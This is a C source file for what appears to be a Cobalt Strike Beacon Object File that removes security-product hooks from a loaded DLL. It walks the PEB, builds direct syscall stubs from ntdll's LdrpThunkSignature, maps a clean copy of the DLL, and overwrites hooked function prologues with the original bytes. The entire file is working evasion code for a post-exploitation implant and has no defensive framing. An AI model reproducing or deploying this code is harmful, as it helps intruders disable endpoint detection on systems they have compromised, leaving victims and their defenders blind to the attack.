#include <windows.h>
#include "lib/libc.h"
#include "lib/beacon.h"
#include "lib/ldr.h"

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);


_NtOpenSection NtOpenSection = 1;
_NtMapViewOfSection NtMapViewOfSection = 1;


VOID *GetModuleHandleC( const char *wModuleName )  
{  
    PPEB pPEB;
	#if _WIN64
        pPEB = (PPEB)__readgsqword(0x60);
    #else
        pPEB = (PPEB)__readfsdword(0x30);
    #endif

	PPEB_LDR_DATA pPEBLdr = pPEB->Ldr;
	LLDR_DATA_TABLE_ENTRY pLdeNTDLL = NULL;

	for (LLDR_DATA_TABLE_ENTRY pLdeTmp = (LLDR_DATA_TABLE_ENTRY)pPEBLdr->InLoadOrderModuleList.Flink; pLdeTmp->DllBase != NULL; pLdeTmp = (LLDR_DATA_TABLE_ENTRY)pLdeTmp->InLoadOrderLinks.Flink) {
        if (mycmpi((char*)pLdeTmp->BaseDllName.Buffer, (char*)wModuleName)) {
			return pLdeTmp->DllBase;
		}
	}
    return 0;  
}



UINT_PTR GetProcAddressC( void *hModule, const char *wAPIName )  
{  
    UINT_PTR uiBaseAddress;
    UINT_PTR uiExportDir;
    UINT_PTR uiNameArray;
    UINT_PTR uiAddressArray;
    UINT_PTR uiNameOrdinals;

    DWORD dwCounter;

    volatile int pe32magic = 0x10b;
    volatile int pe64magic = 0x20b;

    UINT_PTR ret = 0;

    uiBaseAddress = (UINT_PTR)(LPVOID)hModule;

    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe32magic)
    {
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)
            uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe64magic)
    {
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)
            uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR,"[-] Unable to find process architecture");
        return ret;
    }
    //BeaconPrintf(CALLBACK_OUTPUT,"[*]  get the File Offset of the modules NT Header passed");

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress;

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames;

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions;

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals;

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

    //BeaconPrintf(CALLBACK_OUTPUT,"[*] Doing loop");
    for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD))
    {

        char *cpExportedFunctionName = (char*)(uiBaseAddress + DEREF_32(uiNameArray));
        //BeaconPrintf(CALLBACK_OUTPUT,"[+] %S", cpExportedFunctionName);

        if (strcmpC(cpExportedFunctionName, wAPIName) == 0) {
    
            uiAddressArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions;
    
            // use the functions name ordinal as an index into the array of name pointers
            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
    
            // compute the File Offset to the function code
            UINT_PTR funcAddr = uiBaseAddress + DEREF_32(uiAddressArray);
            ret = funcAddr;
            break;
        }
    }

    return ret;
}



BOOL ah_isalfanum(const char C)
{
    BOOL res = (C >= 'a' && C <= 'z') || (C >= 'A' && C <= 'Z') || (C >= '0' && C <= '9');
    return res;
}



BOOL isForwardedFunc(const void* funcAddr)
{
    char* func = (char*)funcAddr;
    const int max_check = 128;
    BOOL forwarder = TRUE;

    for (int i = 0; func[i] && i < max_check; ++i) {

        if (!(ah_isalfanum(func[i]) || func[i] == '.' || func[i] == '_' || func[i] == '-')) {
            forwarder = FALSE;
            break;
        }
    }

    return forwarder;
}



ULONG_PTR BuildSyscallStub(ULONG_PTR pStubRegion, DWORD dwSyscallNo, unsigned int Wow64SystemServiceCall) {
#if _WIN64
    int offset = 4;
    BYTE bSyscallStub[] = {
            0x4c, 0x8b, 0xd1,				// mov     r10,rcx
            0xb8, 0x00, 0x00, 0x00, 0x00,	// mov     eax,xxx
            0x0f, 0x05,						// syscall
            0xc3							// ret
};
#else
    int offset = 1;
    BYTE bSyscallStub[] = {
            0xb8, 0x00, 0x00, 0x00, 0x00,	// mov     eax, xxx
            0xba, 0x70, 0x88, 0xcb, 0x77,	// mov     eax, Wow64SystemServiceCall
            0xff, 0xd2,						// call    edx
            0xc2, 0x18, 0x00,				// return
            0x90                            // nop
    };
#endif
    
    //getchar();
    mycopy((char*)pStubRegion, (char*)bSyscallStub, sizeof(bSyscallStub));
    *(DWORD*)(pStubRegion + offset) = dwSyscallNo;

#if !_WIN64
    *(DWORD*)(pStubRegion + 6) = Wow64SystemServiceCall;
#endif

    return pStubRegion;
}


BOOL InitSyscallsFromLdrpThunkSignature() {
	PPEB pPEB;
#if _WIN64
        pPEB = (PPEB)__readgsqword(0x60);
#else
        pPEB = (PPEB)__readfsdword(0x30);
#endif

	PPEB_LDR_DATA pPEBLdr = pPEB->Ldr;
	LLDR_DATA_TABLE_ENTRY pLdeNTDLL = NULL;

	for (LLDR_DATA_TABLE_ENTRY pLdeTmp = (LLDR_DATA_TABLE_ENTRY)pPEBLdr->InLoadOrderModuleList.Flink; pLdeTmp->DllBase != NULL; pLdeTmp = (LLDR_DATA_TABLE_ENTRY)pLdeTmp->InLoadOrderLinks.Flink) {
        if (strcmpC((char*)pLdeTmp->BaseDllName.Buffer, (char*)L"ntdll.dll") == 0) {
        	pLdeNTDLL = pLdeTmp;
        	break;
        }
	}

	if (pLdeNTDLL == NULL) {
		return FALSE;
	}

	PIMAGE_NT_HEADERS ImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLdeNTDLL->DllBase + ((PIMAGE_DOS_HEADER)pLdeNTDLL->DllBase)->e_lfanew);
	PIMAGE_SECTION_HEADER SectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)&ImageNtHeaders->OptionalHeader + ImageNtHeaders->FileHeader.SizeOfOptionalHeader);

	ULONG_PTR DataSectionAddress = 0;
	DWORD DataSectionSize;

	for (WORD i = 0; i < ImageNtHeaders->FileHeader.NumberOfSections; i++) {
		if (strcmpC((char*)SectionHeader[i].Name, ".data") == 0) {
			DataSectionAddress = (ULONG_PTR)pLdeNTDLL->DllBase + SectionHeader[i].VirtualAddress;
			DataSectionSize = SectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	if (!DataSectionAddress || DataSectionSize < 16 * 5) {
		return FALSE;
	}

    unsigned int Wow64SystemServiceCall = 0;
	DWORD dwNtOpenSection = 0;
	DWORD dwNtMapViewOfSection = 0;

	#if _WIN64
        for (UINT uiOffset = 0; uiOffset < DataSectionSize - (16 * 5); uiOffset++) {
            if (*(DWORD*)(DataSectionAddress + uiOffset) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 16) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 32) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 48) == 0xb8d18b4c &&
                *(DWORD*)(DataSectionAddress + uiOffset + 64) == 0xb8d18b4c) {

                dwNtOpenSection = *(DWORD*)(DataSectionAddress + uiOffset + 48 + 4);
                dwNtMapViewOfSection = *(DWORD*)(DataSectionAddress + uiOffset + 64 + 4);
                break;
            }
        }
    #else
        for (UINT uiOffset = 0; uiOffset < DataSectionSize - (16 * 5); uiOffset++) {
            if (*(byte*)(DataSectionAddress + uiOffset) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 16) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 32) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 48) == 0xb8 &&
                *(byte*)(DataSectionAddress + uiOffset + 64) == 0xb8) {
                    
                //*(BYTE*)(DataSectionAddress + uiOffset + 48 + 6) << 24 | *(BYTE*)(DataSectionAddress + uiOffset + 48 + 7) << 16 | *(BYTE*)(DataSectionAddress + uiOffset + 48 + 8) << 8 | *(BYTE*)(DataSectionAddress + uiOffset + 48 + 9);
                Wow64SystemServiceCall = *(DWORD*)(DataSectionAddress + uiOffset + 48 + 6);
                dwNtOpenSection = *(DWORD*)(DataSectionAddress + uiOffset + 48 + 1);
                dwNtMapViewOfSection = *(DWORD*)(DataSectionAddress + uiOffset + 64 + 1);
                break;
            }
        }
    #endif

	if (dwNtOpenSection == 0 || dwNtMapViewOfSection == 0) {
		return FALSE;
	}

	ULONG_PTR pSyscallRegion = (ULONG_PTR)KERNEL32$VirtualAlloc(NULL, 2 * MAX_SYSCALL_STUB_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (!pSyscallRegion) {
		//printf("[!] Cannot allocate memory for syscals stubs.\n");
		return FALSE;

	}

	NtOpenSection = (_NtOpenSection)BuildSyscallStub(pSyscallRegion + (1 * MAX_SYSCALL_STUB_SIZE), dwNtOpenSection, Wow64SystemServiceCall);
	NtMapViewOfSection = (_NtMapViewOfSection)BuildSyscallStub(pSyscallRegion + (2 * MAX_SYSCALL_STUB_SIZE), dwNtMapViewOfSection, Wow64SystemServiceCall);

	DWORD dwOldProtection;
	BOOL bStatus = KERNEL32$VirtualProtect((LPVOID)pSyscallRegion, 2 * MAX_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &dwOldProtection);

	return TRUE;
}


BOOL removeHooks(HMODULE hmodule, PWSTR moduleRealPath)
{
    UINT_PTR uiBaseAddress;
    UINT_PTR uiExportDir;
    UINT_PTR uiNameArray;
    UINT_PTR uiAddressArray;
    UINT_PTR uiNameOrdinals;

    DWORD dwCounter;

    HANDLE hFileMap = NULL;
    HANDLE hFile = NULL;
    
    PVOID originDll = NULL;    

    volatile int pe32magic = 0x10b;
    volatile int pe64magic = 0x20b;
    
    NTSTATUS ntStatus;

    HMODULE hNtdll = (HMODULE)GetModuleHandleC("ntdll.dll");
    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddressC(hNtdll, "RtlInitUnicodeString");
    _NtUnmapViewOfSection NtUnmapViewOfSection = (_NtUnmapViewOfSection)GetProcAddressC(hNtdll, "NtUnmapViewOfSection");
    _NtClose NtClose = (_NtClose)GetProcAddressC(hNtdll, "NtClose");
    //_NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddressC(hNtdll, "NtProtectVirtualMemory");

    UNICODE_STRING ntSectionName;
    RtlInitUnicodeString(&ntSectionName, moduleRealPath);

    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, &ntSectionName, 0, NULL, NULL);

    HANDLE sectionHandle = NULL;
    PVOID baseAddress = NULL;
    ULONG_PTR viewSize = 0;
    ntStatus = NtOpenSection(&sectionHandle, SECTION_MAP_READ, &ObjectAttributes);
    if(sectionHandle == NULL){
        BeaconPrintf(CALLBACK_ERROR,"[-] NtOpenSection failed");
        return FALSE;
    }
    ntStatus = NtMapViewOfSection(sectionHandle, NtCurrentProcess(), &originDll, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
    if(originDll == NULL){
        BeaconPrintf(CALLBACK_ERROR,"[-] NtMapViewOfSection failed");
        NtClose(sectionHandle);
        return FALSE;
    }

    // parse peb
    uiBaseAddress = (UINT_PTR)(LPVOID)originDll;

    // get the File Offset of the modules NT Header
    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

    if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe32magic)
    {
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS32)
            uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == pe64magic)
    {
        uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS64)
            uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR,"[-] Unable to find process architecture");
        ntStatus = NtUnmapViewOfSection(NtCurrentProcess(), originDll);
	    if (!NT_SUCCESS(ntStatus)) {
	    	BeaconPrintf(CALLBACK_ERROR, "[-] NtUnmapViewOfSection failed");
	    	return FALSE;
	    }
        NtClose(sectionHandle);
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT,"[*]  get the File Offset of the modules NT Header passed");

    // get the File Offset of the export directory
    uiExportDir = uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress;

    // get the File Offset for the array of name pointers
    uiNameArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames;

    // get the File Offset for the array of addresses
    uiAddressArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions;

    // get the File Offset for the array of name ordinals
    uiNameOrdinals = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals;

    // get a counter for the number of exported functions...
    dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;
    //BeaconPrintf(CALLBACK_OUTPUT,"[*] dwCounter: %d", dwCounter);

    //BeaconPrintf(CALLBACK_OUTPUT,"[*] Doing loop");
    for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD))
    {
        char* cpExportedFunctionName = (char*)(uiBaseAddress + DEREF_32(uiNameArray));

        uiAddressArray = uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions;

        // use the functions name ordinal as an index into the array of name pointers
        uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

        // compute the File Offset to the function code
        UINT_PTR funcAddr = uiBaseAddress + DEREF_32(uiAddressArray);

        BOOL isForwarder = isForwardedFunc((const void*)funcAddr);

        if (isForwarder) continue;

        void* funcHooked = (void*)GetProcAddressC(hmodule, cpExportedFunctionName);

        if (!funcHooked) continue;

        BYTE* p = (BYTE*)funcHooked;
        if (p[0] != 0xe9) {
            if (p[0] != 0xff) continue;
            if (p[1] != 0x25) continue;
        }

        //BeaconPrintf(CALLBACK_OUTPUT,"[*] %s", cpExportedFunctionName);

        //#if _WIN64 
        //    BOOL funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;
        //#else
        //    BOOL funcIsHooked = (memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0);  // __MINGW32
        //#endif
        BOOL funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;

        if (!funcIsHooked) continue;

        BeaconPrintf(CALLBACK_OUTPUT,"[*] %s is hooked", cpExportedFunctionName);

        ULONG oldProtect;
        ULONG oldProtect1;
        SIZE_T allocationSize = 64;

        //ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), (void**)&funcHooked, &allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);

        if (!KERNEL32$VirtualProtect(funcHooked, 64, PAGE_EXECUTE_READWRITE, &oldProtect))
            break;

        mycopy((char*)funcHooked, (char*)funcAddr, 10);

        if (!KERNEL32$VirtualProtect(funcHooked, 64, oldProtect, &oldProtect1))
            break;

        //ntStatus = NtProtectVirtualMemory(NtCurrentProcess(), &funcHooked, &allocationSize, oldProtect, &oldProtect1);
    }

	ntStatus = NtUnmapViewOfSection(NtCurrentProcess(), originDll);
	if (!NT_SUCCESS(ntStatus)) {
		BeaconPrintf(CALLBACK_ERROR, "[-] NtUnmapViewOfSection failed");
	}

    NtClose(sectionHandle);

    return TRUE;
}


void go(char* args, int len)
{
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	
	char* targetDLL = BeaconDataExtract(&parser, NULL);
    wchar_t* targetPATH = (wchar_t*)BeaconDataExtract(&parser, NULL);
	
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Target DLL: %S", targetDLL);
    BeaconPrintf(CALLBACK_OUTPUT,"[+] DLL PATH: %S\n", targetPATH);

    HMODULE hTargetDLL = (HMODULE)GetModuleHandleC(targetDLL);
    if(hTargetDLL == 0){
        BeaconPrintf(CALLBACK_ERROR,"[-] GetModuleHandle Failed");
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT ,"[+] GetModuleHandle Success");
    }

    if(!InitSyscallsFromLdrpThunkSignature()){
        BeaconPrintf(CALLBACK_ERROR,"[-] LdrpThunkSignature Failed");
        return;
    }else{
        BeaconPrintf(CALLBACK_OUTPUT,"[+] LdrpThunkSignature Success");
    }
    
    if(!removeHooks(hTargetDLL, targetPATH)){
        BeaconPrintf(CALLBACK_ERROR,"[-] removeHooks Failed");
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT,"[+] removeHooks Success");
    }    
}
